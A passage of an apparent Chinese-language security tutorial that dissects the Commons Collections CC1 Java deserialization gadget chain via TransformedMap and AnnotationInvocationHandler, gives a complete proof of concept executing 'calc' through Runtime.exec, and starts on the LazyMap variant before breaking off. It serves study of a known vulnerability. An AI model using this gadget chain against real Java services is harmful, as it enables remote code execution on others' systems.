title="分析"></a>分析</h3><p><code>TransformedMap</code>类作用是对Map进行装饰，通过<code>keyTransformer</code>、<code>valueTransformer</code>分别对输入的<code>key</code>、<code>value</code>通过<code>transform()</code>方法进行修饰，查看构造函数，接受三个参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>。），将接受的<code>key，value</code>对象转换为本类的<code>Transformer</code>对象</p><p><img src="/posts/dd664be3/cc1-16.png" title="构造函数"></p><p>可调用静态方法（map类型）<code>decorate</code>对新<code>Map</code>对象进行回调，对传入新的<code>Map</code>进行修饰，也就是说可以通过<code>decorate</code>方法去获取<code>TransformedMap</code>的对象</p><p><img src="/posts/dd664be3/cc1-17.png" title="decorate回调"></p><p>简单了解<code>TransformedMap</code>类后，现在回到利用链本身来，找到可以实现的<code>transform(Object)</code>的地方</p><p><img src="/posts/dd664be3/cc1-18.png" title="decorate回调"></p><p>三个方法</p><ul><li>transformKey(Object object)</li><li>transformValue(Object object)</li><li>checkSetValue(Object value)</li></ul><p>其中<code>transformKey</code>、<code>transformValue</code>两个方法分别获取从<code>TransformedMap</code>类的构造方法中传入<code>Transformer keyTransformer</code>、<code>Transformer valueTransformer</code>，再分别调用<code>keyTransformer.transform(object)</code>、<code>valueTransformer.transform(object)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//transformKey方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//transformValue方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查看这两个方法都在哪调用</p><p><img src="/posts/dd664be3/cc1-19.png" title="transformKey方法调用"><br><img src="/posts/dd664be3/cc1-20.png" title="transformValue方法调用"></p><p>这两个方法都在put方法中进行调用，参数就为两个<code>Object</code>对象，传递任意一个参数都可调用对应的<code>transformKey/Value</code>方法，最后put放入<code>key</code>和<code>value</code>。</p><p><img src="/posts/dd664be3/cc1-21.png" title="put方法"></p><p>利用思路：<br>因为<code>TransformedMap</code>中构造函数、<code>transformKey</code>、<code>transformValue</code>方法都是<code>protected</code>受保护的，无法直接声明使用，但可调用<code>decorate</code>公共方法进行回调向构造方法传参，通过<code>transformKey</code>或者<code>transformValue</code>传递其中任意一个参数为<code>InvokerTransformer</code>对象，最后通过<code>TransformedMap</code>的<code>put</code>方法传入恶意函数对象达到执行命令。<br>即：<br>第一步，创建构造参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>），其中key或者value可以随意创造其中一个为<code>InvokerTransformer</code>类对象即可<br>第二步，通过<code>decorate</code>公共方法调用构造方法创建<code>TransformedMap</code>对象<br>第三步，调用<code>TransformedMap</code>的<code>put</code>方法，传递恶意函数对象，对其中key和value参数随便传入一个即可<br>利用方法：</p><p><img src="/posts/dd664be3/cc1-22.png" title="利用"></p><p>但上面这两个方法都在本类Put方法进行调用，也未在其他类中进行调用，同时使用到了<code>InvokerTransformer</code>、<code>Map</code>两个类的对象，因此无法通过readObject反序列化达到命令执行的目的。<br><font color="red">注：反序列化的序列化对象只能为单个对象，无法对多个对象进行序列化。</font></p><p>接下来看第三个方法：<code>checkSetValue(Object value)</code></p><p><img src="/posts/dd664be3/cc1-23.png" title="checkSetValue方法"></p><p>同样也是返回构造方法传入的<code>Transformer valueTransformer</code>，然后调用<code>transform(Object)</code>，但是由于是<code>protected</code>受保护，因此无法像另外两个方法一样直接调用。<br>再看该方法有没有其他类对其调用</p><p><img src="/posts/dd664be3/cc1-24.png" title="checkSetValue方法"></p><p>发现除了本类以外的父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，该类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>官方对该类的描述翻译：</p><blockquote><p>一个抽象基类，简化了创建地图装饰器的任务。<br>MapAPI很难正确修饰，并且涉及实现许多不同的类。这个类的存在是为了提供一个更简单的API。<br>提供了特殊的钩子方法，当对象被添加到地图时调用这些方法。通过重写这些方法，可以验证或操纵输入。除了主要的映射方法，entrySet也会受到影响，这是编写映射实现最困难的部分。<br>该类是包范围的，在将来的Commons Collections版本中可能会被撤回或替换</p></blockquote><p>实现调用<br>前面步骤跟另外两个方法一样，由于不能直接调用，因此重点就在for循环里面，通过遍历<code>HashMap</code>键值对（<code>entrySet()</code>为<code>hashMap</code>映射识图，能返回<code>map</code>键值对），调用<code>setValue()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span><br><span class="line">        <span class="comment">//第一个参数Map对象</span></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="comment">//第二个参数和第三个参数类型一致，且有一个即可调用，传入InvokerTransformer对象</span></span><br><span class="line">        InvokerTransformer iv=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//调用decorate实现实例化对象并调用构造函数传参,Map类型必须为&lt;Object,Object&gt;，否则for循环调用tm对象会导致参数类型不一致会报错</span></span><br><span class="line">        Map&lt;Object,Object&gt; tm= TransformedMap.decorate(map,<span class="literal">null</span>,iv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( Map.Entry entry: tm.entrySet()) &#123;</span><br><span class="line">            <span class="comment">//调用setValue，传递Runtime对象</span></span><br><span class="line">            entry.setValue(Runtime.getRuntime()); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-25.png" title="实现调用"></p><p>现在发现父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，下一个思路就是找到实现序列化接口并且能调用<code>setValue()</code>方法的</p><p><img src="/posts/dd664be3/cc1-26.png" title="setValue()调用"></p><p>找到42个方法，其中<code>AnnotationInvocationHandler</code>类实现了序列化接口，同时重写了<code>readObject</code>方法，并且<code>setValue()</code>在重写的<code>readObject</code>方法中进行调用<br>其中构造函数获取两个参数，一个class类型<code>Class type</code>,一个Map类型<code>Map memberValues</code>，然后进行了type的类型判断，最后返回给变量</p><p><img src="/posts/dd664be3/cc1-28.png" title="AbstractInputCheckedMapDecorator类"></p><p>序列化前半段也是通过<code>getInstance</code>方法对type类型进行判断,判断type的类型是否为注解类的方法类型名，是的话便通过<code>memberTypes()</code>方法获取其成员方法名和返回方法，存在Map类型的<code>memberTypes</code>对象中</p><p><img src="/posts/dd664be3/cc1-27.png" title="重写序列化方法"></p><p>后半段也是最主要的for循环部分，遍历<code>memberValues</code>也就是构造方法传入的第二个参数（传入TransformedMap[]数组），循环获取键名，通过<code>memberTypes.get(name)</code>判断键名是否是注解类（Annotation类，全名java.lang.annotation.Annotation）的方法类型名，如果是的话就获取键值给<code>value</code>变量，<strong>这里通过键名设置注解类（Annotation类）的实例方法名即可通过条件判断</strong>。<br>接下来继续判断<code>if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)</code>意思判断value的值如果不是注解类的方法或者键名的值是ExceptionProxy的实例，则通过<code>memberValue.setValue</code>方法修改该键名的值，<strong>这里只用键值不是注解类（Annotation类）的实例方法名即可满足条件判断</strong>，然后调用<code>memberValue.setValue</code>方法达到目的<br>可以找到注解类Annotation的实现方法（找到引用的java.lang.annotation.Annotation，Ctrl+Alt+鼠标左键点击Annotation即可找到对应的实现方法），找到其中对应有成员的任意方法</p><p><img src="/posts/dd664be3/cc1-31.png" title="实现方法"></p><p>比如Generated注释类，可以put value方法名。（实际测试过程中找到的实现方法有大部分还是不能触发，只有部分类和方法才行）</p><p><img src="/posts/dd664be3/cc1-32.png" title="Generated类"></p><p>现在利用链就完整了，入口点为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法，一直到最后调用<code>InvokerTransformer.transform(Object)</code>方法</p><h3 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>TransformedMap CC1链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                TransformedMap.entrySet()</span><br><span class="line">                    AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                        TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>其中通过上述学习还没涉及到<code>ChainedTransformer.transform()</code>这个环节的利用方法，在构造Poc中可以学习下利用方法和原理</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>理思路<br>1、入口点在为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法中调用<code>setValue()</code>方法，但<code>AnnotationInvocationHandler</code>这个类未声明Public，只有通过反射进行调用。<br>通过反射调用<code>AnnotationInvocationHandler</code>类对象，并且调用构造方法，然后通过实例化向构造方法传参</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class cla=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span></span><br><span class="line">Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"><span class="comment">//传入参数用a,b代替表示</span></span><br><span class="line">Object obj=cons.newInstance(a,b);</span><br></pre></td></tr></table></figure><p>2、接下来久要对传参内容进行确定，传入什么，其中a为Class类对象，b为Map对象，通过反序列化调用，从利用链的分析知道a传入的为注解类<code>Annotation</code>类，可以找到的<code>Generated</code>类的<code>value</code>名称，同时建立<code>HashMap</code>，并put键名为<code>value</code>，键值为任意即可绕过for循环的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Object obj=cons.newInstance(Generated.class,b);</span><br></pre></td></tr></table></figure><p>b为Map对象，并且该参数会执行调用到<code>AnnotationInvocationHandler</code>类<code>readObject</code>方法中的<code>AbstractMapEntryDecorator.MapEntry.setValue()</code>，从而在<code>setValue()</code>方法中调用到<code>TransformedMap.checkSetValue()</code>方法，最后返回调用到<code>TransformedMap</code>中<code>valueTransformer.transform()</code>方法，<code>valueTransformer</code>为<code>TransformedMap</code>构造函数的第三个参数即传入<code>InvokerTransformer</code>类对象，<code>Runtime</code>对象作为<code>transform(Object)</code>参数传入的值<br>但由于Runtime对象未实现序列化接口，无法序列化，并且<code>valueTransformer.transform(Object)</code>中的Object实际并不可控设置为Runtime对象值。因此利用到了<code>ChainedTransformer</code>类，也是上文学习中未提及实际利用方法的类，该类传入Transformer数组，并由transform方法实现循环调用。</p><p><img src="/posts/dd664be3/cc1-34.png" title="ChainedTransformer类"></p><p>因为<code>Runtime</code>类未实现序列化接口，只有通过反射实现对它的调用，即<code>Runtime.class</code>，再由于这个循环会有一个初识的transform(Object)，其中的Object在第一次循环的时候是由调用<code>ChainedTransformer.transform(Object)</code>传入的（传入的重写的反序列化方法中setValue()中的值），并没有实际传入的类对象。</p><p><img src="/posts/dd664be3/cc1-35.png" title="初始的Object值"></p><p>此时通过调用<code>ConstantTransformer</code>类来解决这个问题，一来可以通过它来实现返回<code>Runtime.class</code>对象，二来通过把他设置为<code>TransformedMap</code>数组的首位来规避初始调用的<code>Object</code>的问题，因为<code>ConstantTransformer</code>的<code>transform(Object)</code>不管输入什么都返回构造方法中的对象，然后再通过反射构建<code>Runtime</code>对象并调用<code>exec</code>方法，最后执行命令。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>在理解<code>ConstantTransformer</code>的<code>transform(Object)</code>方法的实际原理时也挺绕，可以试着把上面的执行效果带入到该方法中，能更好的理解如何实现最后调用到<code>InvokerTransformer</code>方法并传入<code>Runtime</code>对象</p><p><img src="/posts/dd664be3/cc1-33.png" title="transform方法"></p><p>通过一次一次循环把对应<code>Object</code>输出到下次作为输入就能理解怎么实现的了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">object = <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class).transform(<span class="number">123</span>); </span><br><span class="line"><span class="comment">//= Runtime.class transform中输入任何数字都返回Runtime对象，但还没实例化</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class) </span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime()  调用Runtime对象的getRuntime() 但该方法还没执行，只是获取了该方法</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;).transform(Runtime.class.getRuntime()) </span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime()  执行Runtime.getRuntime() 此时正式实例化了Runtime对象</span></span><br><span class="line"></span><br><span class="line">Object = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(Runtime.class.getRuntime().invoke())</span><br><span class="line"><span class="comment">//=Runtime.class.getRuntime().exec(&quot;calc&quot;) 执行Runtime.exec()方法</span></span><br></pre></td></tr></table></figure><p>3、在实现了2步骤的一长段的利用链的相关调用，最后就是传递的b就是<code>Transformer transformerChain = new ChainedTransformer(transformers);</code>中的<code>transformerChain</code>数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class cla=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span></span><br><span class="line">Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"><span class="comment">//传入参数用a,b代替表示</span></span><br><span class="line">Object obj=cons.newInstance(Generated.class,transformerChain);</span><br></pre></td></tr></table></figure><p>4、最后就是序列化该<code>AnnotationInvocationHandler</code>对象，反序列化时触发漏洞，得到最终POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler的对象传入tmap</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> declaredConstructor.newInstance(Generated.class, tmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化写入文件</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;result.ser&quot;</span>));</span><br><span class="line">        out.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化触发漏洞</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;result.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="LazyMap链"><a href="#LazyMap链" class="headerlink" title="LazyMap链"></a>LazyMap链</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>接下来是LazyMap链，CC1的另一条链，也是ysoserial中利用CC1的链。在分析<code>InvokerTransformer</code>类时说到该类为最终的执行类，找到调用<code>InvokerTransformer.transform(Object)</code>方法的类，其中有上文分析的TransformedMap类，还有个就是LazyMap类</p><p><img src="/posts/dd664be3/cc1-36.png" title="调用transform方法的类"></p><p>该类通过构造方法传入对象并赋值给<code>factory</code></p><p><img src="/posts/dd664be3/cc1-38.png" title="构造方法"></p><p>调用了<code>transform()</code>方法的<code>get</code>方法</p><p><img src="/posts/dd664be3/cc1-37.png" title="get方法"></p><p><code>get</code>方法中会判断参数<code>key</code>是否为<code>HashMap</code>中<code>Map</code>的内容，如果不是<code>Map</code>中的内容，就创建一个<code>value</code>作为<code>key</code>的值放入<code>Map</code>中，给value赋值时调用了<code>transform()</code>方法。<br>该<code>get()</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用，通过构造方法传入<code>LazyMap</code>对象然后在<code>invoke</code>方法中调用到<code>LazyMap.get()</code>方法</p><p><img src="/posts/dd664be3/cc1-39.png" title="invoke方法"></p><p>invoke方法的调用并不在该类重写的<code>readObject</code>方法中，因此入口点就有点变化，<code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>动态类，这里调用<code>invoke</code>方法就涉及到<strong>动态代理</strong></p><p><img src="/posts/dd664be3/cc1-40.png" title="InvocationHandler"></p><p>动态代理<code>InvocationHandler</code>：</p><blockquote><p>每一个动态代理类的调用处理程序都必须实现InvocationHandler接口，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过动态代理对象调用一个方法时候，这个方法的调用就会被转发到实现InvocationHandler接口类的invoke方法来调用</p></blockquote><p>实现方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[接口类] proxyMap=(接口类)Proxy.newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span><br></pre></td></tr></table></figure><p>例如使用Map对象进行动态代理：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br></pre></td></tr></table></figure><p>其中涉及到<code>Proxy</code>代理类，并通过<code>newProxyInstance()</code>实现动态代理。<br><code>newProxyInstance</code>类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler invh)</span>;</span><br></pre></td></tr></table></figure><p>三个参数分别表示:目标对象所属类的加载器、目标对象实现的接口数组、调用接口时触发的对应方法</p><p>实现demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxydemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">demo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">            <span class="keyword">private</span> Map map;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">demo</span><span class="params">(Map map)</span>&#123;</span><br><span class="line">                <span class="built_in">this</span>.map=map;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;调用了invoke方法&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(method.getName().equals(<span class="string">&quot;put&quot;</span>))&#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;调用了put方法&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        InvocationHandler in=<span class="keyword">new</span> <span class="title class_">demo</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line">        Map map=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,in);</span><br><span class="line">        map.put(<span class="string">&quot;11&quot;</span>,<span class="string">&quot;11&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;22&quot;</span>,<span class="string">&quot;22&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-41.png" title="InvocationHandler"></p><p>可以看到map对象每执行一次方法，便会调用执行一次invoke方法，invoke方法也可以起拦截器的作用。</p><p>简单了解了动态代理的用法，接下来回到LazyMap类的调用<br><code>LazyMap</code>的<code>get</code>方法在<code>AnnotationInvocationHandler</code>类的<code>invoke</code>方法中可调用<br>因此入口点就在实现动态类调用到LazyMap的invoke方法。</p><h3 id="完整利用链-1"><a href="#完整利用链-1" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>LazyMap CC1链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                